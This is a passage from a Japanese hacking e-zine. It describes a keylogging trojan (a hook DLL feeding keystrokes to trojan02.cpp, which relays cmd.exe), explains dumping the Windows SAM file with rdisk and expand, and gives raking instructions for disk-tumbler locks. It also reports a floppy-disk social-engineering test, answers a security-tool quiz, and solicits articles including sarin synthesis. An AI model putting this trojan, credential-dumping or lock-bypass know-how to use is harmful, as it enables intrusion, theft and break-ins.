+　最初にクラス名とタイトル名からFindWindowを使ってWindowハンドルを見つけ
+ます。キー入力を感知したら、これに向けてSendMessageでメッセージを飛ばしま
+す。DLLの処理は基本的にこれだけで、FindWindowでみつけたWindowに向けて横取
+りしたメッセージ（キー入力）を送信するだけです。他はフックをセットもしく
+は解除する関数です。
+
+　DLLファイルの作成方法を理解していれば特に問題ないでしょうけれど一応使い
+方を説明します。コンパイルすると.dllと.libファイルが出来上がるのでDLLファ
+イルを実行ファイル（trojan02.exe）と同じディレクトリにコピーし、さらにコ
+ンパイル時にLIBファイルをリンクします。そして"keyhook.h"もincludeしなけれ
+ばなりません。
+
++--- trojan02.cpp ---------------------------------+
+| http://kenjinet.s26.xrea.com/trojan/trojan02.cpp |
++--------------------------------------------------+
+
+　そして、これがHookDll.dllを利用してキーログ機能を追加した最終的なプログ
+ラムです。といっても少し書き加えた程度なので読んでみてください。WM_KEYHOOK
+を受け取ってその値を保存しているだけです。ファイル操作にCreateFile関数や
+WriteFile関数を利用していますが、もちろんfopenやfwriteなどを利用してもな
+んら問題ありません。どちらが速いかは分かりませんが（どちらかというとfopen
+などの方がよさそうですが）まぁこれはテスト的なものなのでどちらでもいいで
+しょう。
+
+　まだまだ機能が少なく実用的ではありませんが、かたちとしては一応これで完
+成とします。今回のトロイはcmd.exeの橋渡しをするだけのシンプルなものでした
+が、自分でいろんな機能を実装していけばさらに楽しめるかと思います。しかも
+このトロイはnetstatコマンドに見つかってしまうという致命的なヘボさも持ち合
+わせておりますのでこのへんもまだまだ改良の余地があります(^^;
+
+
+■0x09.) 最後に
+
+　さて、いかがだったでしょうか。今までの私の記事と比べると少し難易度が高
+めになってますけれど、ネットワーク関連のプログラムを知っていればさほど難
+しくはないと思います。ちなみにタイトルが「～Windows篇～」となっていますが、
+いつの日かLinux篇も書いてみようかなと考えておりますが「いつの日か」ですの
+であまり期待しないで待っててください(^^;　さて、最後になりましたがここま
+で付き合って読んでくださった方本当に有り難うございました。
+
+　では、また会う日まで...
+
+
+■0x10.) 参考文献
+
+・『猫でもわかるネットワークプログラミング』粂井康孝 著
+・『ハッカー・プログラミング大全』UNYUN 著
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第４章: 数値列のメモの考察 ---
+
+著者：D
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) 数値列のメモの考察
+
+　控えていってもらいたくない数値や番号があるとします。
+　それらがちらっとでも見えたとき情報を欲する人間というのは書き写したりし
+ていきます。
+　ですが、目の前で堂々と控えていったりしていれば「その数値（番号）は消し
+てください」と言えます。または不審な行動を見たとき、「どうしました？　」
+と牽制することも出来ます。
+　それらをかいくぐって写していくとしたら技術としてはこんなものが挙げられ
+ます。
+
+●２進数を使う
+
+　電話番号などを控えていくときにこれを使う人間がいます。
+
+（例）
+　　　	　　０３－１２３４－５６７８
+			↓
+　０，０１１，００１，０１０，０１１，１００，１０１，１１０，１１１，１０００
+
+　「０」と「１」の羅列を一度に見てもはっきりいってわからない人間が多いと思
+います。２進数の話が出ていないのに相手が急に「０」と「１」しか書かないよう
+になったら、気をつけてください。
+
+●１６進数を使う
+
+（例）
+　　　	　　０３－１２３４－５６７８
+			↓
+　０，０１１，００１，０１０，０１１，１００，１０１，１１０，１１１，１０００				↓
+　０，０Ｂ，０１，０Ａ，０Ｂ，０Ｃ，Ａ０，Ａ１，Ｂ０，１Ｂ，Ａ００
+
+　通常、２進数を１６進数に変換する場合４ビットつまり４つ区切りの２進数で
+考えます。それを逆に考えて「０１１」という２進数を「０，１１」という１０
+進数として考えて「０Ｂ」と置き換える人間がいます。　こんな面倒くさい暗号
+のようにする必要があるのか疑問ですが、こんなことをしているやつには気をつ
+けてください。
+
+●１０進数と１６進数を使う
+　簡単な文字列を数字を混ぜて書いてるやつがいたらそいつは情報を盗んでいます。
+
+（例）
+
+ＩＤ：ＤＡＴＡ　、ＰＡＳＳ：ＨＡＣＫ
+		↓
+Ｉ１３：１３１０Ｔ１０　Ｐ１０：Ｈ１０１２Ｋ
+
+　ＡからＦまでの文字を１６進数として考えて１０進数に置き換える。
+　こうしてわからなくしている人間がいますので、アルファベットの間に数字を
+使っているやつには気をつけてください。
+
+　企業と言うのはいろいろなものを買うために見積りを必ず取ります。
+　当たり前の話なんですがね。　私も見積りを出したり受け取ったりするわけな
+んです。
+　で、出すものは絶対紙ベースなんですが、受け取るものの中にはデータのもの
+やフロッピーのものがあります。　データとしてメールで送られてくるものは基
+本的にウィルススキャンがかかるので安心だと思っているのですが、怖いのはフ
+ロッピーで圧縮されているものです。　身元がはっきりしているものは信用して
+解凍してしまうので、ウィルススキャンはかけないんです。
+　まあ、ほとんど見積もりだけなのでいいんですけど、これを悪用に考えるとフ
+ロッピーの中に書類だけでなくウィルス／ワームを忍び込ませておいたらと言う
+ことです。
+
+　最も原始的な方法ではあるのですがこれはないとは言い切れないんですね。
+
+　ちなみに実験を行ってみました。
+
+○概要
+
+　信頼している業者がフロッピーでデータを渡してきたらウィルススキャンを行
+うか？
+　ちなみに、中のデータはウィルス無し（何度もスキャンをかけて安全なもの）
+の見積りデータ、圧縮はＺＩＰの自己解凍（ＥＸＥ形式）
+
+○実施方法
+
+　アポイント無しで直接訪問、ターゲットがいた場合は直接渡す、いない場合は
+受付など代理のものに中身の詳細、受け取り後の連絡を要することを伝えてフロ
+ッピーを渡す。
+
+※今回は代理の人間が受け取った。
+
+○結果
+　ターゲットより連絡が来る。・・・・・見積り内容について
+
+　その後、
+
+私「ところで、私のファイルをウィルススキャンしましたか？」
+ターゲット（以下：Ｔ）「したよ。」
+私「解凍する前に？」
+Ｔ「いや。解凍後に。」
+
+　上記の実験を他２件に同じ事をしましたが２件とも解凍後スキャンもしくはス
+キャン無しでした。ここから考えるとフロッピーとデータの中身をしっかりと伝
+えておくとウィルススキャンは手抜きで行っていると言えます。
+　もし、解凍と同時に反映になったりするウィルス／ワームだったら一撃で感染
+です。
+　フロッピーで見積りを持ってくるやつには気をつけてください。
+
+○備考
+　この実験のことは該当の担当者に事後、きちんと報告しウィルス感染も認めら
+れませんでした。　無論、ネットワーク、システム、クライアントＰＣ全てが問
+題無く稼動しています。
+
+
+■0x02.) おわりに
+
+　先日、面白い場所に出くわしました。
+　なんでも、私の隣人が倒れているらしいと公務員の人たちが押しかけてきまし
+た。　聞くところによると家の電話に何度かけても出ないので突入したいからベ
+ランダを経由させて欲しいとの事。
+　公務員だったので疑わずに通しました。でも、窓は鍵がかけてあり突入はでき
+ない。私が大家に電話して合鍵を持ってきてもらったわけですが、中に入るとも
+ぬけの殻。誰もいない。公務員達も不思議がっていました。大家から隣人の携帯
+番号を聞き、連絡してみると飲んでいる最中であった。
+　いたずらと言うことで処理されましたが、正直「うちにもいつかこんないたず
+らが来るんじゃないだろうな？」とちょっと不安になったりしました。
+　で、ここでよく考えるとまあ、緊急車両のランプがついていた（ていうか緊急
+車両があった）から本物だと信用したわけですが、こんな状況だと来た者を偽者
+だと判断することは状況的にかなり難しい気がしますね。制服なんかいくらでも
+偽造できるわけですし、緊急車両のランプだって売ってるわけじゃないですか。
+ワゴン車にそういうものをつけて来られたらあまり偽者だと疑えないような気が
+します。それに、この状況で公務員の人たちは身分証明書を見せなかったですか
+らね。
+　大家のところではなく私のところに来たのもおかしいとは思うのですが、慌て
+ていたんですかね？　それと、「ガス漏れの可能性もありますので、入らないで
+下さい！入れるようになったらこちらから指示します！！」と、大家も外に出さ
+れていました。
+　この誰もいない状況を考えたら何か盗めるんじゃないか？なんて悪いことも考
+えちゃいますよ。　緊急時ほど偽装は見抜けない可能性があります。
+
+　皆さん、気をつけてください。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第５章: ディスク・タンブラー錠のピッキング ---
+
+著者：Defolos
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　前回ではピン・タンブラー錠のピッキングについてのテキストを書かせてもら
+いました。今回はディスク・タンブラー錠の開錠についてを書きたいと思います。
+
+　基本的なことは前回に書いてありますので、はじめて読む方は前回から読むこ
+とをおすすめします。
+
+http://wizardbible.org/7/7.txt
+
+
+■0x02.) ディスク・タンブラーとは
+
+　ディスクタンブラー錠はピンタンブラー錠と人気を二分する錠です。
+ディスク状のタンブラーを使っていて、そのシンプルさ故に鍵穴に埃や砂などが
+入り込んでも比較的壊れにくく、破綻にも強いという特徴があります。
+
+　ここでは"ウェハー・タンブラー錠"を例にとって解説していきましょう。
+
+参照→http://wizardbible.org/8/image/picture_11.GIF
+
+
+　ディスクタンブラーのロックシステムはとても単純です。ロック時はディスク
+の一部が、スプリングに押されて外殻にはみ出ていてるためシリンダーを回すこ
+とができないようになっています。
+
+参照→http://wizardbible.org/8/image/picture_12.GIF
+
+　この外殻にはみ出した部分をシリンダーの中に収めることができれば開錠とな
+ります。
+
+参照→http://wizardbible.org/8/image/picture_13.GIF
+
+
+■0x03.) ディスク・タンブラー錠の開錠
+
+　基本的にはピン・タンブラー錠と変わりはありませんが、ディスク・タンブラ
+ー錠の開錠ではレーキング（Raking）という技術を使います。レーキングという
+のは、引っ掻くような動作でピックを前後に動かし開錠する技術です。では、実際にやってみましょう。
+
+●錠を用意する
+
+　まずは錠を用意しましょう。いきなり難しい錠を買っても無駄になる可能性も
+ありますので、最初は簡単なものを購入しましょう。初めてであれば自転車用の
+チェーン錠がおすすめです。技術が上がってきたら補助鍵、ドアノブの鍵とレベ
+ルを上げていくのが良いでしょう。
+　なお、自転車用のチェーン錠は100円ショップやホームセンターの自転車用品コ
+ーナーで、補助鍵とドアノブもホームセンターで購入できます。
+
+●ズレをつくる
+
+　ピン・タンブラー錠と同じようにズレをつくり、そのズレにタンブラーを引っ
+かけることで開錠します。ピン・タンブラー錠との違いは、ズレはタンブラーの
+上下に発生するということです。2ヶ所にズレが発生することでタンブラーの押
+し上げすぎがなくなり、その特徴のおかげでレーキングという技術が使えるので
+す。
+
+●レーキング
+
+　レーク・ピック（http://wizardbible.org/7/image/picture_4.GIF）を手にし、
+鍵穴にピックを差し込みます。
+　後はピックをやさしく前後に動かします。前後に動かしていれば自然とタンブ
+ラーは適切な高さになり、開錠できます。
+　注意することは、「引っ掻くような動作」と言っても力任せに引っ掻いてはい
+けません。ピックを折ったり、最悪の場合、錠のタンブラーを壊しかねません。
+やさしく、ゆっくり動かしてください。
+
+
+■0x04.) ダブル・ディスク・タンブラー錠
+
+●ダブル・ディスク・タンブラーとは
+
+　ダブル・ディスク・タンブラーとはピッキング対策のひとつで、鍵穴の上部と
+下部の両側にタンブラーを配置したものです。通常の片側タンブラー（シングル
+・ディスク・タンブラー）よりも難易度が大幅に上がっています。
+
+参照→http://wizardbible.org/8/image/picture_14.GIF
+
+●開錠方法
+
+　このタイプの錠の開け方も基本的にはシングル・ディスク・タンブラーと変わ
+りありません。テンションを掛け、上下どちらか一方のタンブラーを解除してか
+ら、もう片方のタンブラーを解除すれば開錠できます。この時テンションをあま
+り奥まで差し込まず、できるだけ浅い位置でテンションを掛けてください。でな
+いとテンションが邪魔になってうまくレーキングできないと思います。どうして
+もテンションが邪魔になる場合は、ダブルディスク用のテンションを使ってください。
+
+参照→http://wizardbible.org/8/image/picture_15.GIF
+
+●ダブルサイド・ピック
+
+　ダブル・ディスク・タンブラー錠専用のピックツール（レークツール？　）に
+ダブルサイド・ピックというものがあります。テンションとピックが一体になっ
+ており、先端は二股に分かれています。この二股は通常のテンションと兼用した
+り、鍵穴の出っ張りを回避するためのものです。
+
+参照→http://wizardbible.org/8/image/picture_16.GIF
+
+　使い方は、鍵穴に差込み右方向にテンションを掛けつつピックを前後に動かし
+ます。テンションを掛けにくいと感じたら二股の間にテンションを差し込んでく
+ださい。サイズやギザギザの間隔などを変えたものを数本用意しておき、うまく
+いかなかったら次のピックへと交換していくのが良いでしょう。
+
+
+■0x05.) サイドバー・ディスク・タンブラー錠
+
+●サイドバー・ディスク・タンブラーとは
+
+　サイドバー・ディスク・タンブラーとはピッキング対策のひとつで、最も優れ
+たピッキング対策と言っていいと思います。タンブラーにサイドバーを配置し、
+不正開錠は運に頼る以外はほとんどできません。このタイプの錠についてのピッ
+キング方法は今のところありませんので内部構造と、どうしてピッキングが不可
+能なのかを説明していきたいと思います。
+
+●内部構造
+
+　サイドバー・ディスク・タンブラーの内部構造は、通常のディスク・タンブラ
+ーとそれほどの違いはありません。普通と違う点は、錠の上部にサイドバーとい
+う棒状の物が配置されており、タンブラーにそのサイドバーが収まるように切り
+込み（スロット）を施してある点です。鍵がかかっているいる状態ではサイドバ
+ーがシリンダーと外殻の間に位置しており、このサイドバーが回転を邪魔するた
+めに開けることはできません。鍵が刺さっていている状態では、タンブラーが所
+定の位置に揃い（ここは普通のディスク・タンブラー錠と同じ）、それに合わせ
+て作られた切込みが一直線に揃います。するとサイドバーは重力で下に落ち、シ
+リンダー内へ移動します。この状態で初めてシリンダーを回すことができます。
+
+参照→http://wizardbible.org/8/image/picture_17.GIF
+
+　これは錠を正面から見た図で、この図で言いますと上部の白い部分がサイドバ
+ーで薄い灰色の部分がタンブラーになります。
+
+●ピッキングが不可能な理由
+
+　サイドバー・ディスク・タンブラー錠がピッキング不可能な理由は、ピッキン
+グの基本である「ズレをつくり、そのズレにタンブラーを引っかける」という動
+作ができないからです。
+　また、これまでの錠ではタンブラーを押し上げると「カチッ」といった感覚が
+得られましたが、サイドバー・ディスク・タンブラー錠ではそのような感覚は全
+くなく、ピッキングを不可能にする要因のひとつとなっています。何も感覚が得
+られないのはシリンダーを固定しているのはタンブラーではなくサイドバーであ
+ることに起因します。サイドバーが落ちた時にしか感覚は感じ取れませんが、サ
+イドバーが落ちた時はスロットが一直線に揃ったときであり、開錠できた時です。
+
+　以上の理由からサイドバー・ディスク・タンブラー錠のピッキングはほとんど
+不可能です。できるだけ早くこのタイプかどうかを見極めてください。
+
+
+■0x06.) 最後に
+
+　ディスク・タンブラー錠のピッキングはどうだったでしょうか。ディスク・タ
+ンブラー錠はこれから減少していく、あるいはサイドバー・ディスク・タンブラ
+ー錠へ交換していく傾向にあると思います。今のうちに気が済むまで練習してお
+くのもいいと思います。家の玄関の錠などはあまり頻繁に交換しないと思います
+が、それが原因でピッキング被害に逢うというのは十分に考えられます。もしサ
+イドバー・ディスク・タンブラー錠かそれ以上に高度な対策済みの錠への交換が
+まだでしたら、できるだけ早めに交換することをおすすめします。
+
+　今回はあまりうまく説明をまとめることができませんでした、ところどころ変
+なところやわかりずらいところがあると思いますが、ここまで読んでくれた皆様
+に感謝します。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第６章: セキュリティツール基礎問題 ～解答編～ ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　今回は、前回のWizard Bible vol.7で取り上げた10問の解答を行います。
+
+　問題は次のURLになるので、比較しながら読むとよいと思います。
+
+http://akademeia.info/wizardbible/7/7.txt
+
+　ちなみに、『ハッカー認定試験』という本がデータハウスから発売されていま
+す。今回の記事のような形式でセキュリティ、ネットワーク、ハッキングなどに
+ついて楽しく学習できるようになっています。興味ある方はよろしくお願いしま
+す。
+
+http://www.data-house.co.jp/book/nintei.html
+
+
+■0x02.) 解答
+
+●第１問の解答
+
+（１）アプリケーションバナーを複数調べることによって、それらソフトウェア
+が対応しているOSが絞り込まれるので、ターゲットホストのOSを推測できる。た
+だし、経験と知識が必要である。
+（２）nmapに備わっているスタックフィンガープリンティング技術を用いること
+で、高い精度でOSを識別することができる。OS識別のためのオプションは-Oであ
+る。
+（３）ettercapは本来Snifferですが、Passive Scanningモードやフィンガープリ
+ントを利用することによって、LAN内のホストのOSを特定できる。
+（４）正解。Etherealはネットワーク内にどんなデータが流れているかを調べる
+Snifferである。よって、基本的にEthereal単体だけではOSを識別することはでき
+ない。
+（５）Cainは対Windows用のアタックユーティリティである。Cainの「Network」
+タブを選択して、「All Computers」内のリストを表示させることによって、LAN
+内のOSを推測できる。その際、OSの種類だけでなく、バージョンまで判断できる。
+この点でettercap利用によるOS推測より優れている。
+（６）QuesoはOS識別に特化したツールである。しかし、Quesoの公式サイトもつ
+ぶれていて、OS特定のための大事なconfファイルのバージョンアップがなされて
+いるのかも不明なので、今はほとんど使われない。
+（７）CheopsはOS識別のツールである。ドメイン、IPブロック、動作中のホスト
+などの状況を視覚的に表示する。HP製のプリンタやAscend製のルーターなども判
+別することができる。
+
+●第２問の解答
+
+（１）システム全体のネットワークインターフェースをチェックし、デバックモ
+ードやプロミスキャスモードにあるインターフェースを報告するツールである。
+（２）CPM（Check Promiscuous Mode）はカーネギーメロン大学が開発したスニ
+ファー検知ツールである。
+（３）Windowsで動作し、GUIで操作可能な、プロミスキャスモードで動くと推測
+されるシステムを事前にテストすることができるツールである。AntiSniffはPing
+応答に聞き耳を立てて、プロミスキャスモードで動作するLANアダプタを装備する
+ホストを検出する。
+（４）Windows NT 4.0/2000/XPで動作するプロミスキャストモードを検出するた
+めのツールである。
+（５）おとりの誘導をして、アタッカーがその誘導に乗ったとき、悪意のある盗
+聴を発見しようというものである。この方法では複数のクライアントマシンが手
+当たり次第に所定のサーバーにログオンして、幾つかの命令を実行してログオフ
+する。サーバーは意味のある仕事を実行するわけではなく、アタッカーのおとり
+になる目的で存在するだけである。幾つかのクライアントを見せかけのログイン
+に参加するように割り当てておく。それ以外のクライアントからログオンが試み
+られたら、盗聴を行った結果ログインパスワードを入手したので、ログインしよ
+うとしているに違いないと判断できる。このとき、おとりサーバーはおとりクラ
+イアント以外のIPアドレスから試みられたログインを全て記録して、不審な行動
+をチェックする。
+（６）kstat、alamo、checkpsといったrootkitを検出するための専用ツールであ
+る。chrootkitを実行すると、過去に出現したrootkitやワーム、不正なLKMが残す
+痕跡を順に調べて、それらがシステムに存在するかどうかを調べる。さらに、重
+要なコマンドが改ざんされていないか、そのシステムがネットワークを盗聴して
+いないか（NICがプロミスキャスモードになっていないか）などもチェックしてく
+れる。
+（７）正解。存在しないツール名である。
+（８）Linuxで動作し、サブネット内のSniffer活動を検知するためのツールであ
+る。
+
+●第３問の解答
+
+（１）Guestアカウントの状態、ファイルシステム、共有などをチェックしてくれ
+る。
+（２）正解。立ち上がっているサービスは、コントロールパネルでチェックでき
+る。また、ポートスキャンを行うという方法も考えられる。
+（３）パスワードが無いアカウントや簡単なパスワードが設定されているアカウ
+ントをチェックしてくれる。
+（４）IIS Lockdown toolsが適応されているかどうか、サンプルアプリケーショ
+ンが残されたままかどうかをチェックしてくれる。
+（５）MS SQLの認証、パスワードの脆弱性の調査。
+（６）修正プログラムの適応済み・未適応をチェックしてくれる。
+
+●第４問の解答
+
+（１）正解。「rdisk /s」コマンドを実行することで、%systemroot%\repair内の
+レジストリキーを更新した後、システム修復ディスクを作成することができる。
+このとき、SAMファイルの圧縮コピーが、%Systemroot%\repairディレクトリに
+sam._ファイルとして作成される。この圧縮ファイルであるsam._ファイルを他の
+NTシステムで、「expand %Systemroot%\repair\sam._ C:\sam.txt」のようにexpand
+コマンドで展開する。後は、「type sam.txt」と入力すれば内容を閲覧できる。
+（２）FDやHDをフォーマットすることためのコマンドである。
+（３）Windowsのシステムファイルを編集するためのエディタで、システムエディ
+タと呼ぶ。
+（４）wowexec.exe（Windows on Windows サブシステム）は、WindowsXP上で16ビ
+ットプログラムを動作させるためのプログラムである。「 wowexec.exe」のよう
+に一文字下げられているが、これはタスクマネージャーで見やすくするためのも
+のなので安心してよい。他にもバーチャルマシンで動作する各16ビットプログラ
+ムの実行名のエントリが字下げされて表示される。
+
+●第５問の解答
+
+（１）セキュリティ情報付きのコピーコマンドである。ファイル形式がNTFSであ
+るとファイルにセキュリティ情報が付いている。scopy.exeを通常のcopy.exe同様
+に使うことができる。
+（２）コマンドラインからユーザープロファイルを削除するためのツールである。
+（３）タイムサーバー用のプログラム。
+（４）正解。アタッカーがなぜPDCをファーストアタックするかといえば、その理
+由はPDCがユーザー・アカウントを集中的に管理していることに他ならないからで
+ある。PDCの保持しているユーザーアカウントのリストの中に、Windowsドメイン
+を管理している管理者アカウントが含まれる。管理者アカウントは一般のユーザ
+ーアカウントよりも上位の権限を持っていて、そのWindowsドメイン内の全てのリ
+ソースにアクセス可能である。UNIXでいうroot権限のようなものである。よって、
+アタッカーは、PDCを掌握して、Windowsドメインの管理者アカウントを奪取しよ
+うとするわけである。
+　大規模ネットワークであればあるほど、PDCを探し出すのは困難になる。ところ
+が、Windowsドメイン名さえわかってしまえば、PDCは簡単に見つけることができ
+る。WindowsNTリソースキット（NTRK）のnltest.exeを「nltest /DCLIST:[Windo
+wsドメイン名]」のように使用すればよい。
+
+●第６問の解答
+
+（１）1999年にベル研究所（http://www.bell-labs.com/）の研究者が公開した、
+バッファオーバーフローに有効なライブラリである。GPLライセンスで公開されて
+いる。バッファオーバーフローを発生させる典型的なパターンの一つは、プログ
+ラム中で不用意にstrcpy()関数を呼び出したり、不注意なsprintf()関数の記述を
+行うといったものである。これらのバッファオーバーフローの発生源となりやす
+いライブラリ関数を、バッファオーバーフローが発生しないように再実装したの
+がlibsafeである。それだけでなく、バッファオーバーフローを発生させると、警
+告を出力させたり、システムログに記録するといった監視機能も持ち合わせてい
+る。
+（２）米RedHat社のカーネル開発者であるIngo Molnar氏が2003年5月2日にリリー
+スしたバッファオーバーフロー発生時の危険性を定言するカーネルセキュリティ
+機構である。Exec Shildには、データ記憶領域でのプログラム実行の禁止と参照
+されにくいメモリ位置へのプログラム配置の機能が備わっており、この2つをLinux
+のカーネルに組み込むことで、実行プログラムにバッファオーバーフローを引き
+起こすバグがあったとしても、アタッカーにより不正にプログラムを実行された
+り、任意のコマンドを実行される危険性が減らす。
+（３）バッファオーバーフローの発生が起きないように修正したコンパイラであ
+る。コンパイル時、バッファオーバーフローをガードするための値（カナリアと
+呼ぶ）をリターンアドレスが書かれている前に挿入する。しかし、機能から分か
+るように、リターンアドレス以外の値を書き換えるタイプのバッファオーバーフ
+ローには対処できない。
+（４）正解。造語なので存在しない。
+（５）StackGuardを強化したものである。関数のポインタやロングジャンプバッ
+ファなどといった値を保護する機能がある。ただし、StackGuardよりも使用が難
+しいという難点がある。
+
+●第７問の解答
+
+（１）regedit.exeを拡張したレジストリエディタである。
+（２）「Service Host」のことで、Windows2000/XPの各種サービスを呼び出すプ
+ログラムである。また、CodeBlueやNachiといったウイルスに感染すると同じ名前
+（SVCHOST.EXE）でウイルス感染ファイルが作られる。しかし、svchost.exeが存
+在するからといって絶対にウイルスに感染しているとは限らない。気になるとき
+はウイルススキャンで調べるのが重要である。
+（３）「Print Spooler」のことで、プリンターへ送ったデータを一時的に蓄えて、
+PCの解放を早くする機能を持つ。
+（４）正解。MSが提供しているフリーのCUIツールである。属しているグループに
+アクセスして、セキュリティ修正プログラムの適応の有無をチェックすることができる。
+
+●第８問の解答
+
+（１）正解。私が勝手に考えたツール名なので、存在しないと思う。
+（２）nbtscanは一度にクラスCネットワークをスキャンすることが可能である。
+（３）enumは、NULLセッション後、user2sidとsid2userを実行する方法を自動化
+したプログラムである。このenumを使えばNetBIOS名以外にもアカウントの情報さ
+えも抜き出せる。
+（４）NetBIOSスキャナのシェアウェア。他にも、Ping、tracerouteなどを搭載し
+ており、HTMLファイルまたはテキストファイルでレポートを作成できる。
+（５）Windowsで動作するGUIのツールである。シェアウェア。
+
+●第９問の解答
+
+（１）造語なので存在しない。
+（２）正解。libpcap（the Packet Capture library）はパケットをキャプチャす
+るためのライブラリである。スニファーを作成するとき、pcapを利用すると便利
+である。
+（３）Windows用のpcapライブラリである。
+（４）Perl用のpcapライブラリである。
+
+●第１０問の解答
+
+　Etherealは、Windows/Macintosh/UNIXで動作するGUIの高機能なSnifferである。
+Etherealを使えば、パケットを全て監視できるわけだが、不要なパケットの記録
+もあり、そのままではあまり効率のよい監視ができないこともある。そこで、特
+定のパケットだけを選択するために、フィルタリングを行うとよい。このEthereal
+のパケットログのフィルタリングには、ディスプレイフィルタとキャプチャフィ
+ルタの2通りがある。前者はキャプチャした全パケットから特定のパケットだけを
+選択し表示し、後者はキャプチャ時に特定のパケットだけを取り込む。ここの問
+題は前者のディスプレイフィルタに関する問題である。
+（１）192.168.1.10に関するIPパケットを全て表示するルールである。つまり、
+送信元あるいは送信先が192.168.1.10であるIPパケットが対象となる。
+（２）正解。src（source）は送信元という意味である。
+（３）dst（destination）は送信先という意味である。
+
+
+■0x03.) 最後に
+
+　今回は私が10問作って問題出しましたが、次回のWizard Bibleに自分も問題出
+したいという人がいましたら、是非気軽にメールください。もちろんいつも原稿
+を送ってくださっている著者の方でも結構です。多数の連絡お待ちしております。
+
+　では、また来月会いましょう。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第７章: UNDERGROUND JOURNALイベント ---
+
+著者：まどさん
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) コラム：UNDERGROUND JOURNALイベント
+
+　ツツきどころ満載のショボいcgiフォームによる予約申し込みも好調のようで、
+感謝感激雨霰。いくつか、追加情報がありますので、この場をお借りしてフライ
+ング告知させていただきます。
+
+　３名の大物によるプレゼンテーションとトークショーが決まりました。
+
+　「山崎はるかさん」「黒川かえるさん」がそれぞれスペシャルゲストとして参
+加してくださることになりました。このお二方のイベント内容については後日、
+発表いたします。
+
+　また、「漏れにけったらきけ～！」という名フレーズで一世を風靡しかけたま
+まのk00Lさんが「OpenBSDの月危弱性（仮題）」もしくは「シャコタン大旋風（仮
+題）」のいずれかを、じゃんけんで決めてプレゼンを行います。
+
+　ようやく、女性スタッフも揃い、イベントに向けて着々と用意が整ってきました。
+間もなく、会議室で最終調整をおこない、イベントの詳しい内容を固めて告知をし
+たいと思っております。
+
+　ご期待ください。
+
+＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝
+　　　　　　　　　　　―　UNDERGROUND JOURNAL　―
+
+■開催日時・場所
+　●2004年3月20日（土）24:00～28:30
+　●東京都新宿区内クラブ
+　※会場詳細や地図については参加者のみメールにて通知
+
+■チケット
+　●チケットプライス：\3.500（税込み）
+　●一般参加者募集人数：150名
+　　→http://ruffnex.oc.to/uj/
+　※ドリンク費用は各自負担（持ち込み厳禁）
+　※３月１０日（水）募集打ち切り
+　※予約申し込みはサイトにて
+　※銀行振込手数料は各自負担
+
+＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第７章：お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+○Wizard Bible（http://2600ch.com/）では随時、執筆ライターを募集していま
+す。
+　扱う内容のテーマは広義での「under ground」です。例えば、ハッキングから
+サリンガスの合成法などと幅広い内容を考えています。また、各種、特殊な職業
+や趣味を持った方のレクチャーなども含まれます。
+　一回きりでも構いません。また、必ず、毎回連載する義務もありませんのでで
+きる範囲で構いません。気軽に声をかけてください。もちろん一回書いたことが
